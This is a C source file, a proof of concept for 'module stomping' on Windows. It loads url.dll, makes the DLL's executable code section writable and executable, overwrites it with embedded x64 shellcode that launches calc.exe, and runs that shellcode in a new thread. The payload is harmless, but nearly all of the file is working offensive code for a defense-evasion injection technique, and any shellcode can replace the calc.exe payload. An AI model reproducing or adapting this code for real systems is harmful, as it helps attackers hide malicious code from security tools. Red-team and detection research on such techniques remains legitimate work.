/*local module stomping - dll hijacking stomping*/

#include <windows.h>
#include <stdio.h>
#include <psapi.h>

// Shellcode to launch calc.exe
unsigned char calc_shellcode[] = {
    0xFC, 0x48, 0x83, 0xE4, 0xF0, 0xE8, 0xC0, 0x00, 0x00, 0x00, 0x41, 0x51, 0x41, 0x50, 0x52,
    0x51, 0x56, 0x48, 0x31, 0xD2, 0x65, 0x48, 0x8B, 0x52, 0x60, 0x48, 0x8B, 0x52, 0x18, 0x48,
    0x8B, 0x52, 0x20, 0x48, 0x8B, 0x72, 0x50, 0x48, 0x0F, 0xB7, 0x4A, 0x4A, 0x4D, 0x31, 0xC9,
    0x48, 0x31, 0xC0, 0xAC, 0x3C, 0x61, 0x7C, 0x02, 0x2C, 0x20, 0x41, 0xC1, 0xC9, 0x0D, 0x41,
    0x01, 0xC1, 0xE2, 0xED, 0x52, 0x41, 0x51, 0x48, 0x8B, 0x52, 0x20, 0x8B, 0x42, 0x3C, 0x48,
    0x01, 0xD0, 0x8B, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48, 0x85, 0xC0, 0x74, 0x67, 0x48, 0x01,
    0xD0, 0x50, 0x8B, 0x48, 0x18, 0x44, 0x8B, 0x40, 0x20, 0x49, 0x01, 0xD0, 0xE3, 0x56, 0x48,
    0xFF, 0xC9, 0x41, 0x8B, 0x34, 0x88, 0x48, 0x01, 0xD6, 0x4D, 0x31, 0xC9, 0x48, 0x31, 0xC0,
    0xAC, 0x41, 0xC1, 0xC9, 0x0D, 0x41, 0x01, 0xC1, 0x38, 0xE0, 0x75, 0xF1, 0x4C, 0x03, 0x4C,
    0x24, 0x08, 0x45, 0x39, 0xD1, 0x75, 0xD8, 0x58, 0x44, 0x8B, 0x40, 0x24, 0x49, 0x01, 0xD0,
    0x66, 0x41, 0x8B, 0x0C, 0x48, 0x44, 0x8B, 0x40, 0x1C, 0x49, 0x01, 0xD0, 0x41, 0x8B, 0x04,
    0x88, 0x48, 0x01, 0xD0, 0x41, 0x58, 0x41, 0x58, 0x5E, 0x59, 0x5A, 0x41, 0x58, 0x41, 0x59,
    0x41, 0x5A, 0x48, 0x83, 0xEC, 0x20, 0x41, 0x52, 0xFF, 0xE0, 0x58, 0x41, 0x59, 0x5A, 0x48,
    0x8B, 0x12, 0xE9, 0x57, 0xFF, 0xFF, 0xFF, 0x5D, 0x48, 0xBA, 0x01, 0x00, 0x00, 0x00, 0x00,
    0x00, 0x00, 0x00, 0x48, 0x8D, 0x8D, 0x01, 0x01, 0x00, 0x00, 0x41, 0xBA, 0x31, 0x8B, 0x6F,
    0x87, 0xFF, 0xD5, 0xBB, 0xE0, 0x1D, 0x2A, 0x0A, 0x41, 0xBA, 0xA6, 0x95, 0xBD, 0x9D, 0xFF,
    0xD5, 0x48, 0x83, 0xC4, 0x28, 0x3C, 0x06, 0x7C, 0x0A, 0x80, 0xFB, 0xE0, 0x75, 0x05, 0xBB,
    0x47, 0x13, 0x72, 0x6F, 0x6A, 0x00, 0x59, 0x41, 0x89, 0xDA, 0xFF, 0xD5, 0x63, 0x61, 0x6C,
    0x63, 0x2E, 0x65, 0x78, 0x65, 0x00
};

// Find url.dll module
HMODULE FindUrlDll() {
    HMODULE hModules[1024];
    DWORD cbNeeded;
    HANDLE hProcess = GetCurrentProcess();

    printf("[+] Searching for url.dll...\n");

    if (EnumProcessModules(hProcess, hModules, sizeof(hModules), &cbNeeded)) {
        for (DWORD i = 0; i < (cbNeeded / sizeof(HMODULE)); i++) {
            char szModuleName[MAX_PATH];
            if (GetModuleFileNameA(hModules[i], szModuleName, sizeof(szModuleName))) {
                if (strstr(szModuleName, "url.dll")) {
                    printf("[+] Found url.dll: %s\n", szModuleName);
                    printf("[+] Module base: 0x%p\n", hModules[i]);
                    return hModules[i];
                }
            }
        }
    }

    printf("[-] url.dll not found in process\n");
    printf("[+] Trying to load url.dll...\n");

    // Try to load url.dll if not already loaded
    HMODULE hUrlDll = LoadLibraryA("url.dll");
    if (hUrlDll) {
        printf("[+] Successfully loaded url.dll: 0x%p\n", hUrlDll);
        return hUrlDll;
    }

    printf("[-] Failed to load url.dll\n");
    return NULL;
}

// Stomp the module with shellcode
BOOL StompModule(HMODULE hModule) {
    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)hModule;
    if (pDosHeader->e_magic != IMAGE_DOS_SIGNATURE) {
        printf("[-] Invalid DOS header\n");
        return FALSE;
    }

    PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((BYTE*)hModule + pDosHeader->e_lfanew);
    if (pNtHeaders->Signature != IMAGE_NT_SIGNATURE) {
        printf("[-] Invalid NT header\n");
        return FALSE;
    }

    // Find executable section (.text usually)
    PIMAGE_SECTION_HEADER pSection = IMAGE_FIRST_SECTION(pNtHeaders);

    for (WORD i = 0; i < pNtHeaders->FileHeader.NumberOfSections; i++) {
        if ((pSection[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) &&
            (pSection[i].Characteristics & IMAGE_SCN_CNT_CODE)) {

            printf("[+] Found executable section: %s\n", pSection[i].Name);
            printf("[+] Section RVA: 0x%X\n", pSection[i].VirtualAddress);
            printf("[+] Section size: %d bytes\n", pSection[i].Misc.VirtualSize);

            LPVOID sectionAddress = (BYTE*)hModule + pSection[i].VirtualAddress;
            SIZE_T sectionSize = pSection[i].Misc.VirtualSize;

            if (sizeof(calc_shellcode) > sectionSize) {
                printf("[-] Shellcode too large for section\n");
                return FALSE;
            }

            // Change memory protection
            DWORD oldProtect;
            if (!VirtualProtect(sectionAddress, sectionSize, PAGE_EXECUTE_READWRITE, &oldProtect)) {
                printf("[-] Failed to change memory protection: %d\n", GetLastError());
                return FALSE;
            }

            printf("[+] Memory protection changed to RWX\n");

            // Save original bytes (for demonstration)
            printf("[+] Saving original bytes...\n");

            // Copy shellcode to the section
            printf("[+] Copying shellcode to module...\n");
            memcpy(sectionAddress, calc_shellcode, sizeof(calc_shellcode));

            printf("[+] Module stomped successfully!\n");

            // Create a thread to execute the shellcode
            printf("[+] Executing shellcode...\n");

            HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)sectionAddress, NULL, 0, NULL);
            if (hThread) {
                WaitForSingleObject(hThread, 2000);
                CloseHandle(hThread);
                printf("[+] Shellcode executed\n");
            }
            else {
                printf("[-] Failed to create thread: %d\n", GetLastError());
            }

            // Restore original protection
            VirtualProtect(sectionAddress, sectionSize, oldProtect, &oldProtect);

            return TRUE;
        }
    }

    printf("[-] No suitable executable section found\n");
    return FALSE;
}

int main() {
    printf("URL.DLL Module Stomping POC - Calc.exe\n");
    printf("======================================\n");

    // Find or load url.dll
    HMODULE hUrlDll = FindUrlDll();
    if (!hUrlDll) {
        printf("[-] Failed to find or load url.dll\n");
        return 1;
    }

    // Stomp the module
    if (StompModule(hUrlDll)) {
        printf("[+] POC completed successfully!\n");
    }
    else {
        printf("[-] Module stomping failed\n");
        return 1;
    }

    // Cleanup
    FreeLibrary(hUrlDll);

    return 0;
}
